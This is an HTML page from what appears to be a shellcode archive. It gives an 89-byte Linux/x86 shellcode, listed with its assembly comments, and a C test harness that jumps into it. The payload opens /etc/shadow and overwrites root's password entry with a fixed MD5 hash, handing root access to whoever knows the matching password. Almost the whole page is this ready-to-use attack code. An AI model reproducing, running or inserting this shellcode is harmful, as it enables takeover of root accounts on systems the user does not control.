<html><head><title>Linux/x86 - pwrite(/etc/shadow, hash, 32, 8) - 89 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 | Title: Linux/x86 pwrite(&quot;/etc/shadow&quot;, hash, 32, 8) Shellcode 89 Bytes
 | Description: replace root's password with hash of &quot;agix&quot; in MD5
 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

#include &lt;stdio.h&gt;

char shellcode[] =
&quot;\x31\xC9&quot;            		//xor ecx,ecx
&quot;\x51&quot;              		//push ecx
&quot;\x68\x61\x64\x6F\x77&quot;   	//push dword 0x776f6461
&quot;\x68\x63\x2F\x73\x68&quot;      	//push dword 0x68732f63
&quot;\x68\x2F\x2F\x65\x74&quot; 		//push dword 0x74652f2f
&quot;\x89\xE3&quot;               	//mov ebx,esp
&quot;\x66\xB9\x91\x01&quot;         	//mov cx,0x191
&quot;\x31\xC0&quot;               	//xor eax,eax
&quot;\xB0\x05&quot;               	//mov al,0x5
&quot;\xCD\x80&quot;               	//int 0x80
&quot;\x89\xC3&quot;               	//mov ebx,eax
&quot;\xEB\x12&quot; 			//jmp short 0x34
&quot;\x59&quot; 				//pop ecx
&quot;\x31\xC0&quot;               	//xor eax,eax
&quot;\x31\xD2&quot;               	//xor edx,edx
&quot;\xB2\x20&quot;               	//mov dl,0x20
&quot;\xB0\xB5&quot;               	//mov al,0xb5
&quot;\x31\xF6&quot;               	//xor esi,esi
&quot;\x6A\x08&quot;            		//push byte +0x8
&quot;\x5E&quot;                 		//pop esi
&quot;\x31\xFF&quot;               	//xor edi,edi
&quot;\xCD\x80&quot;               	//int 0x80
&quot;\xE8\xE9\xFF\xFF\xFF&quot;      	//call 0x22
//db &quot;IMMkmgi9$NuhPs1B8H5uz7kEOeKf2H1:&quot;
&quot;\x49\x4D\x4D\x6B\x6D\x67\x69\x39&quot;
&quot;\x24\x4E\x75\x68\x50\x73\x31\x42&quot;
&quot;\x38\x48\x35\x75\x7A\x37\x6B\x45&quot;
&quot;\x4F\x65\x4B\x66\x32\x48\x31\x3A&quot;;

int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&amp;ret + 2;
        (*ret) = (int) shellcode;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
